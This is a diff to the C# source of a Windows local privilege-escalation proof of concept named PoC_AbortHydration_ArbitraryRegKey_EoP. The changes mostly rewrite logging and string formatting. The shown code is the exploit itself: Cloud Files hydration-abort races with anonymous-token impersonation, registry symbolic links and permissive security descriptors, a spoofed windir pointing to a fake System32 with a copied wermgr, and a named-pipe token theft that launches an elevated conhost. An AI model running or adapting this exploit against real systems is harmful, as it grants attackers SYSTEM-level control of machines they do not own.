@@ -115,43 +115,83 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 
         private static readonly object _lock = new object();
 
-        public static void Log(LogLevel level, string message, Exception ex = null)
+        public static void Log(LogLevel level, string message, Exception ex)
         {
             lock (_lock)
             {
                 var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
-                var prefix = $"[{timestamp}] [{level}]";
+                var prefix = string.Format("[{0}] [{1}]", timestamp, level);
 
                 Console.ForegroundColor = GetColorForLevel(level);
-                Console.WriteLine($"{prefix} {message}");
+                Console.WriteLine("{0} {1}", prefix, message);
 
                 if (ex != null)
                 {
-                    Console.WriteLine($"{prefix} Exception: {ex.GetType().Name}");
-                    Console.WriteLine($"{prefix} Message: {ex.Message}");
-                    Console.WriteLine($"{prefix} StackTrace: {ex.StackTrace}");
+                    Console.WriteLine("{0} Exception: {1}", prefix, ex.GetType().Name);
+                    Console.WriteLine("{0} Message: {1}", prefix, ex.Message);
+                    Console.WriteLine("{0} StackTrace: {1}", prefix, ex.StackTrace);
                 }
 
                 Console.ResetColor();
             }
         }
 
-        public static void Debug(string message) => Log(LogLevel.Debug, message);
-        public static void Info(string message) => Log(LogLevel.Info, message);
-        public static void Warning(string message) => Log(LogLevel.Warning, message);
-        public static void Error(string message, Exception ex = null) => Log(LogLevel.Error, message, ex);
-        public static void Critical(string message, Exception ex = null) => Log(LogLevel.Critical, message, ex);
+        public static void Log(LogLevel level, string message)
+        {
+            Log(level, message, null);
+        }
+
+        public static void Debug(string message)
+        {
+            Log(LogLevel.Debug, message);
+        }
+
+        public static void Info(string message)
+        {
+            Log(LogLevel.Info, message);
+        }
+
+        public static void Warning(string message)
+        {
+            Log(LogLevel.Warning, message);
+        }
+
+        public static void Error(string message, Exception ex)
+        {
+            Log(LogLevel.Error, message, ex);
+        }
+
+        public static void Error(string message)
+        {
+            Log(LogLevel.Error, message, null);
+        }
+
+        public static void Critical(string message, Exception ex)
+        {
+            Log(LogLevel.Critical, message, ex);
+        }
+
+        public static void Critical(string message)
+        {
+            Log(LogLevel.Critical, message, null);
+        }
 
         private static ConsoleColor GetColorForLevel(LogLevel level)
         {
             switch (level)
             {
-                case LogLevel.Debug: return ConsoleColor.Gray;
-                case LogLevel.Info: return ConsoleColor.White;
-                case LogLevel.Warning: return ConsoleColor.Yellow;
-                case LogLevel.Error: return ConsoleColor.Red;
-                case LogLevel.Critical: return ConsoleColor.DarkRed;
-                default: return ConsoleColor.White;
+                case LogLevel.Debug:
+                    return ConsoleColor.Gray;
+                case LogLevel.Info:
+                    return ConsoleColor.White;
+                case LogLevel.Warning:
+                    return ConsoleColor.Yellow;
+                case LogLevel.Error:
+                    return ConsoleColor.Red;
+                case LogLevel.Critical:
+                    return ConsoleColor.DarkRed;
+                default:
+                    return ConsoleColor.White;
             }
         }
     }
@@ -167,7 +207,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
     {
         public NtKey OpenKey(NtKey root, string path, KeyAccessRights desiredAccess)
         {
-            Logger.Debug($"Opening registry key: {path} with access: {desiredAccess}");
+            Logger.Debug(string.Format("Opening registry key: {0} with access: {1}", path, desiredAccess));
 
             try
             {
@@ -177,12 +217,12 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                     {
                         if (key.IsSuccess)
                         {
-                            Logger.Debug($"Successfully opened key: {path}");
+                            Logger.Debug(string.Format("Successfully opened key: {0}", path));
                             return key.Result.Duplicate();
                         }
                     }
 
-                    Logger.Debug($"Retrying with anonymous token for: {path}");
+                    Logger.Debug(string.Format("Retrying with anonymous token for: {0}", path));
                     using (var imp = NtThread.Current.ImpersonateAnonymousToken())
                     {
                         return NtKey.Open(obja, desiredAccess, KeyCreateOptions.NonVolatile);
@@ -191,7 +231,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to open registry key: {path}", ex);
+                Logger.Error(string.Format("Failed to open registry key: {0}", path), ex);
                 throw;
             }
         }
@@ -200,21 +240,21 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                Logger.Debug($"Setting security descriptor on: {key.FullPath}");
+                Logger.Debug(string.Format("Setting security descriptor on: {0}", key.FullPath));
                 var sd = new SecurityDescriptor(ExploitConfig.PERMISSIVE_SDDL);
                 key.SetSecurityDescriptor(sd, info);
-                Logger.Debug($"Security descriptor set successfully on: {key.FullPath}");
+                Logger.Debug(string.Format("Security descriptor set successfully on: {0}", key.FullPath));
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to set security descriptor on: {key.FullPath}", ex);
+                Logger.Error(string.Format("Failed to set security descriptor on: {0}", key.FullPath), ex);
                 throw;
             }
         }
 
         public void ForceDeleteKey(NtKey root, string name)
         {
-            Logger.Info($@"Force deleting registry key: {root.FullPath}\{name}");
+            Logger.Info(string.Format("Force deleting registry key: {0}\\{1}", root.FullPath, name));
 
             try
             {
@@ -238,12 +278,12 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                     Logger.Debug("Opened for enumeration and deletion");
                     DeleteRegistryTree(key);
                     key.Delete();
-                    Logger.Info($"Successfully deleted: {name}");
+                    Logger.Info(string.Format("Successfully deleted: {0}", name));
                 }
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to force delete key: {name}", ex);
+                Logger.Error(string.Format("Failed to force delete key: {0}", name), ex);
                 throw;
             }
         }
@@ -252,7 +292,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                Logger.Debug($"Deleting registry tree under: {root.FullPath}");
+                Logger.Debug(string.Format("Deleting registry tree under: {0}", root.FullPath));
                 foreach (var name in root.QueryKeys())
                 {
                     ForceDeleteKey(root, name);
@@ -260,7 +300,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to delete registry tree: {root.FullPath}", ex);
+                Logger.Error(string.Format("Failed to delete registry tree: {0}", root.FullPath), ex);
                 throw;
             }
         }
@@ -269,13 +309,13 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                Logger.Info($"Creating symbolic link: {linkPath} -> {targetPath}");
+                Logger.Info(string.Format("Creating symbolic link: {0} -> {1}", linkPath, targetPath));
                 NtKey.CreateSymbolicLink(linkPath, null, targetPath);
                 Logger.Info("Symbolic link created successfully");
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to create symbolic link: {linkPath} -> {targetPath}", ex);
+                Logger.Error(string.Format("Failed to create symbolic link: {0} -> {1}", linkPath, targetPath), ex);
                 throw;
             }
         }
@@ -284,7 +324,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                Logger.Debug($"Setting registry value: {keyPath}\\{valueName} = {value}");
+                Logger.Debug(string.Format("Setting registry value: {0}\\{1} = {2}", keyPath, valueName, value));
                 using (var key = NtKey.Open(keyPath, null, KeyAccessRights.SetValue))
                 {
                     key.SetValue(valueName, value);
@@ -293,7 +333,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to set registry value: {keyPath}\\{valueName}", ex);
+                Logger.Error(string.Format("Failed to set registry value: {0}\\{1}", keyPath, valueName), ex);
                 throw;
             }
         }
@@ -302,19 +342,19 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                Logger.Info($"Cleaning up subkeys under: {subkeyPath}");
+                Logger.Info(string.Format("Cleaning up subkeys under: {0}", subkeyPath));
                 using (var key = Registry.Users.OpenSubKey(subkeyPath, RegistryRights.FullControl))
                 {
                     if (key == null)
                     {
-                        Logger.Warning($"Key not found: {subkeyPath}");
+                        Logger.Warning(string.Format("Key not found: {0}", subkeyPath));
                         return;
                     }
 
                     foreach (var subkey in key.GetSubKeyNames())
                     {
-                        var fullSubkeyPath = $@"{targetKey}\{subkey}";
-                        Logger.Debug($"Cleaning up subkey: {fullSubkeyPath}");
+                        var fullSubkeyPath = string.Format("{0}\\{1}", targetKey, subkey);
+                        Logger.Debug(string.Format("Cleaning up subkey: {0}", fullSubkeyPath));
 
                         NtKey ntSubkey = null;
                         try
@@ -334,13 +374,13 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                         ntSubkey.Delete();
                         ntSubkey.Close();
 
-                        Logger.Debug($"Subkey deleted: {fullSubkeyPath}");
+                        Logger.Debug(string.Format("Subkey deleted: {0}", fullSubkeyPath));
                     }
                 }
             }
             catch (Exception ex)
             {
-                Logger.Error($"Failed to cleanup subkeys: {subkeyPath}", ex);
+                Logger.Error(string.Format("Failed to cleanup subkeys: {0}", subkeyPath), ex);
                 throw;
             }
         }
@@ -373,10 +413,10 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 
         public ExploitState CurrentState
         {
-            get => _currentState;
+            get { return _currentState; }
             private set
             {
-                Logger.Info($"State transition: {_currentState} -> {value}");
+                Logger.Info(string.Format("State transition: {0} -> {1}", _currentState, value));
                 _currentState = value;
             }
         }
@@ -391,7 +431,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         {
             try
             {
-                Logger.Info($"=== Executing Stage {stageNumber} ===");
+                Logger.Info(string.Format("=== Executing Stage {0} ===", stageNumber));
 
                 switch (stageNumber)
                 {
@@ -412,16 +452,16 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                         Stage3_ExecutePayload();
                         break;
                     default:
-                        throw new ArgumentException($"Invalid stage number: {stageNumber}");
+                        throw new ArgumentException(string.Format("Invalid stage number: {0}", stageNumber));
                 }
 
                 CurrentState = ExploitState.Completed;
-                Logger.Info($"=== Stage {stageNumber} completed successfully ===");
+                Logger.Info(string.Format("=== Stage {0} completed successfully ===", stageNumber));
             }
             catch (Exception ex)
             {
                 CurrentState = ExploitState.Failed;
-                Logger.Critical($"Stage {stageNumber} failed", ex);
+                Logger.Critical(string.Format("Stage {0} failed", stageNumber), ex);
                 throw;
             }
         }
@@ -436,7 +476,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 try
                 {
-                    Logger.Debug($"Spawning stage {i} process");
+                    Logger.Debug(string.Format("Spawning stage {0} process", i));
 
                     var config = new Win32ProcessConfig
                     {
@@ -451,15 +491,15 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 
                         if (waitResult != NtStatus.STATUS_SUCCESS)
                         {
-                            throw new InvalidOperationException($"Stage {i} process did not complete successfully");
+                            throw new InvalidOperationException(string.Format("Stage {0} process did not complete successfully", i));
                         }
 
-                        Logger.Info($"Stage {i} process completed");
+                        Logger.Info(string.Format("Stage {0} process completed", i));
                     }
                 }
                 catch (Exception ex)
                 {
-                    Logger.Error($"Failed to spawn stage {i} process", ex);
+                    Logger.Error(string.Format("Failed to spawn stage {0} process", i), ex);
                     throw;
                 }
             }
@@ -470,20 +510,16 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             Logger.Info("Starting hydration abort loop with registry monitoring");
 
             // Start registry change monitoring thread
-            var checkKeyThread = new Thread(CheckKeyThread)
-            {
-                IsBackground = true
-            };
+            var checkKeyThread = new Thread(CheckKeyThread);
+            checkKeyThread.IsBackground = true;
             checkKeyThread.Start(monitorRootKey);
 
             Thread.Sleep(ExploitConfig.THREAD_STARTUP_DELAY_MS);
 
             // Start anonymous token forcing thread
             var currentThread = NtThread.OpenCurrent();
-            var anonThread = new Thread(ForceTokenThread)
-            {
-                IsBackground = true
-            };
+            var anonThread = new Thread(ForceTokenThread);
+            anonThread.IsBackground = true;
             anonThread.Start(currentThread);
 
             Logger.Info("Entering infinite hydration abort loop");
@@ -568,7 +604,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 using (var key = _registryService.OpenKey(null, ExploitConfig.BLOCKED_APPS_KEY, KeyAccessRights.Delete))
                 {
-                    Logger.Info($"Cleaning up symbolic link: {key.FullPath}");
+                    Logger.Info(string.Format("Cleaning up symbolic link: {0}", key.FullPath));
                     key.Delete();
                 }
             }
@@ -604,7 +640,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 var currentExePath = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
                 _registryService.SetRegistryValue(ExploitConfig.TARGET_KEY, "windir", currentExePath);
-                Logger.Info($"Set fake windir to: {currentExePath}");
+                Logger.Info(string.Format("Set fake windir to: {0}", currentExePath));
             }
             catch (Exception ex)
             {
@@ -621,10 +657,10 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 var fakeSystem32 = currentExePath + ExploitConfig.SYSTEM32_SUBDIR;
                 var fakeWerPath = fakeSystem32 + ExploitConfig.WERMGR_EXECUTABLE;
 
-                Logger.Info($"Creating fake System32 directory: {fakeSystem32}");
+                Logger.Info(string.Format("Creating fake System32 directory: {0}", fakeSystem32));
                 Directory.CreateDirectory(fakeSystem32);
 
-                Logger.Info($"Copying executable to: {fakeWerPath}");
+                Logger.Info(string.Format("Copying executable to: {0}", fakeWerPath));
                 File.Copy(Process.GetCurrentProcess().MainModule.FileName, fakeWerPath, true);
 
                 return fakeWerPath;
@@ -653,7 +689,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                         werTask.Dispose();
                     }
 
-                    Logger.Info($"Waiting for pipe connection (timeout: {ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS}ms)");
+                    Logger.Info(string.Format("Waiting for pipe connection (timeout: {0}ms)", ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS));
                     bool connected = pipeWaitTask.Wait(ExploitConfig.PIPE_CONNECTION_TIMEOUT_MS);
 
                     return connected;
@@ -674,7 +710,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 var fakeSystem32 = Path.GetDirectoryName(fakeWerPath);
 
-                Logger.Info($"Cleaning up fake files: {fakeWerPath}");
+                Logger.Info(string.Format("Cleaning up fake files: {0}", fakeWerPath));
                 if (File.Exists(fakeWerPath))
                     File.Delete(fakeWerPath);
 
@@ -717,7 +753,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 
             try
             {
-                Logger.Debug($"Registry monitoring thread started for: {path}");
+                Logger.Debug(string.Format("Registry monitoring thread started for: {0}", path));
 
                 using (var key = NtKey.Open(path, null, KeyAccessRights.MaximumAllowed))
                 {
@@ -746,7 +782,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             {
                 using (var thread = (NtThread)threadParam)
                 {
-                    Logger.Debug($"Token forcing thread started for thread: {thread}");
+                    Logger.Debug(string.Format("Token forcing thread started for thread: {0}", thread));
 
                     using (var token = TokenUtils.GetAnonymousToken())
                     {
@@ -781,7 +817,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
         static void Main(string[] args)
         {
             Logger.Info("=== Windows Privilege Escalation PoC Started ===");
-            Logger.Info($"Process ID: {Process.GetCurrentProcess().Id}");
+            Logger.Info(string.Format("Process ID: {0}", Process.GetCurrentProcess().Id));
 
             try
             {
@@ -826,7 +862,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 using (var identity = System.Security.Principal.WindowsIdentity.GetCurrent())
                 {
                     bool isSystem = identity.IsSystem;
-                    Logger.Info($"Current identity: {identity.Name} (IsSystem: {isSystem})");
+                    Logger.Info(string.Format("Current identity: {0} (IsSystem: {1})", identity.Name, isSystem));
                     return isSystem;
                 }
             }
@@ -842,8 +878,9 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
             try
             {
                 Logger.Debug("Verifying Cloud Files API availability");
-                NativeInterop.CfGetPlatformInfo(out NativeInterop.CF_PLATFORM_INFO platformInfo).CheckHResult();
-                Logger.Info($"Cloud Files API available - Build: {platformInfo.BuildNumber}");
+                NativeInterop.CF_PLATFORM_INFO platformInfo;
+                NativeInterop.CfGetPlatformInfo(out platformInfo).CheckHResult();
+                Logger.Info(string.Format("Cloud Files API available - Build: {0}", platformInfo.BuildNumber));
             }
             catch (Exception ex)
             {
@@ -854,11 +891,11 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 
         private static void ExecuteExploitStage(int stage)
         {
-            Logger.Info($"Executing exploit stage: {stage}");
+            Logger.Info(string.Format("Executing exploit stage: {0}", stage));
 
             if (stage < 0 || stage >= ExploitConfig.TOTAL_STAGES)
             {
-                throw new ArgumentException($"Invalid stage number: {stage}. Must be 0-{ExploitConfig.TOTAL_STAGES - 1}");
+                throw new ArgumentException(string.Format("Invalid stage number: {0}. Must be 0-{1}", stage, ExploitConfig.TOTAL_STAGES - 1));
             }
 
             var stateMachine = new ExploitStateMachine();
@@ -867,7 +904,7 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
 
         private static void ExecuteWithCredentials(string username, string password)
         {
-            Logger.Info($"Executing with credentials for user: {username}");
+            Logger.Info(string.Format("Executing with credentials for user: {0}", username));
 
             try
             {
@@ -900,20 +937,21 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                 Logger.Info("Restored windir environment variable");
 
                 // Connect to named pipe
-                Logger.Info($"Connecting to named pipe: {ExploitConfig.PIPE_NAME}");
+                Logger.Info(string.Format("Connecting to named pipe: {0}", ExploitConfig.PIPE_NAME));
                 using (var pipeClient = new NamedPipeClientStream(ExploitConfig.PIPE_NAME))
                 {
                     pipeClient.Connect();
 
                     // Get session ID from pipe server
                     IntPtr pipeHandle = pipeClient.SafePipeHandle.DangerousGetHandle();
-                    if (!NativeInterop.GetNamedPipeServerSessionId(pipeHandle, out uint sessionId))
+                    uint sessionId;
+                    if (!NativeInterop.GetNamedPipeServerSessionId(pipeHandle, out sessionId))
                     {
                         Logger.Error("Failed to get named pipe server session ID");
                         return;
                     }
 
-                    Logger.Info($"Retrieved session ID: {sessionId}");
+                    Logger.Info(string.Format("Retrieved session ID: {0}", sessionId));
                     pipeClient.Dispose();
 
                     // Duplicate and modify token
@@ -921,10 +959,10 @@ namespace PoC_AbortHydration_ArbitraryRegKey_EoP
                     using (var duplicatedToken = token.DuplicateToken())
                     {
                         duplicatedToken.SetSessionId((int)sessionId);
-                        Logger.Info($"Token session ID set to: {sessionId}");
+                        Logger.Info(string.Format("Token session ID set to: {0}", sessionId));
 
                         // Launch elevated process
-                        Logger.Info($"Launching elevated conhost.exe");
+                        Logger.Info("Launching elevated conhost.exe");
                         Win32Process.CreateProcessAsUser(
                             duplicatedToken,
                             ExploitConfig.CONHOST_PATH,
